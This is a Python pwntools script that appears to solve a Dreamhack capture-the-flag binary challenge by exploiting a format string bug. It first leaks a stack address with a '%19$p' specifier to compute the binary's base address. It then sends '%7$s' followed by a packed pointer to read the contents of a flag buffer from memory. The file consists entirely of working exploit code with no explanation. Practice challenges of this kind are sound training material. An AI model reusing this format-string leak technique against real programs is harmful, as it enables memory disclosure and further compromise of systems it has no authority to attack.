#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 22008)

    return r


def main():
    r = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"2")
    r.send(b"%19$p\n")
    
    fsb_ret = int(r.recvline()[:-1], 16)
    bin_base = fsb_ret - exe.symbols["main"] - 131
    flag_buf = bin_base + exe.symbols["flag_buf"]

    r.sendlineafter(b"> ", b"2")
    r.send(b"%7$s\n".ljust(8, b"\x00") + p64(flag_buf))

    flag = r.recvline()[:-1]
    log.success(f"flag: {flag.decode()}")

if __name__ == "__main__":
    main()